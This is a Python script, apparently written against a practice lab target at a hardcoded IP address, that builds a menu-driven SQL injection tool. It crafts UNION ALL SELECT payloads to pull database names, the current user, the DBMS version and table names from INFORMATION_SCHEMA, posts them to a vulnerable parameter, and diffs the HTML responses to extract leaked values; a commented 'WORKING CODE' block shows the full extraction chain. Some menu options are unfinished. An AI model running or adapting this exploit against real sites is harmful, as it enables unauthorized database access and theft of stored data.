import requests
from utils import read_headers_file
import re
from bs4 import BeautifulSoup

def get_sqli_info(payload):
    data = [
		{"data": "database","value":"", "payload":""},
		{"data": "username","value":"", "payload":""},
		{"data": "version","value":"", "payload":""},
        {"data": "tables","value":"", "payload":""},
	]
    info = [
		{"payload":"SCHEMA_NAME",	"source":"FROM INFORMATION_SCHEMA.SCHEMATA"}, #Databases
		{"payload":"user()",		"source":""}, #User
		{"payload":"@@version",		"source":""}, # DBMS Version
        {"payload":"TABLE_NAME",    "source": "FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE "}

	]
    cont = 0
    for i in info:
        aux_payload = payload
        aux_payload = aux_payload.replace("payload", i["payload"])
        aux_payload = aux_payload.replace("source", i["source"])
        data[cont]["payload"] = aux_payload
        cont += 1
    return data

def add_values_to_data_payload(raw_values, payload):
    values = raw_values.split()
    payload['value'] = values
    print(payload)

def get_request(url):
    response  = requests.get(url)
    return response

def post_request(url, data=None, header= None):
    response = requests.post(url, data, headers= header)
    return response

def string_to_json(payload_str):
    try:
        key_value = payload_str.split('=',1)
        if len(key_value) != 2:
            raise ValueError(f"Formato invalido: {payload_str}")
        key = key_value[0].strip()
        value = key_value[1].strip()
        return {key:value}
    except Exception as e:
        print(f"Error procesando el string: {e}")
        return

def limpiar_html(html):
    """Convierte HTML a texto plano, eliminando etiquetas y espacios innecesarios."""
    soup = BeautifulSoup(html, 'html.parser')
    texto = soup.get_text()
    # Eliminar múltiples espacios en blanco
    texto = re.sub(r'\s+', ' ', texto)
    return texto.strip()

def html_diff(text1, text2):
    
    text1 = limpiar_html(text1)
    text2 = limpiar_html(text2)
    
    word1 = text1.split()
    word2 = text2.split()
    
    different_words = []
    cont = 0
    min_len = min(len(word1),len(word2))
    
    for i in range (min_len):
        if word1[i] != word2[i]:
            different_words.append(word2[i])
    
    if len(word2) > min_len:
        different_words.extend(word2[min_len:])
    return " ".join(different_words)


url = "http://"+"83.136.253.5:51945/case2.php"
headers = read_headers_file("./headers.txt")
payload = {"id": "1"}
test = "id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -"

#WORKING CODE
"""
response1 = post_request(url, payload, headers).text


payload = string_to_json(test)
response2 = post_request(url, payload, headers).text # Payload OK

aux_payloads = get_sqli_info(test)
database_payload = string_to_json(aux_payloads[0]['payload'])
response3 = post_request(url, database_payload, headers).text
result = html_diff(response1,response3)

add_values_to_data_payload(result, aux_payloads[0])
"""

#------------
def menu(option):
    global url, payload, test
    if option == 0:
        return 0
    elif option == 10:
        new_url = str(input("New url:\t\033[0m"))
        url = new_url
    run()

def run():
    print("\nWelcome to your SQL Injection Interface\n")
    print(f"\033[32m--------------\n|\
    URL:\033[37m\t\t{url}\033[32m\n|\
    Vulnerable param:\t\033[37m{payload}\033[32m\n|\
    SQLi Payload:\t\033[31m{test}\033[32m")
    print("-------------\n")
    
    print("\033[36mENUMERATION")
    print(f"--------------")
    enumeration_data = get_sqli_info(test)
    for data in enumeration_data:
        print(f"|\t{data['data']}:\t\033[37m{data['value']}\033[36m")
    print(f"--------------")

    print("\033[33mOPTIONS")
    print(f"--------------")
    print("10)\tSet URL")
    print("11)\tSet Payload")
    print("\n0) Exit")
    
    option = int(input("Choose option:\t"))
    menu(option)

run()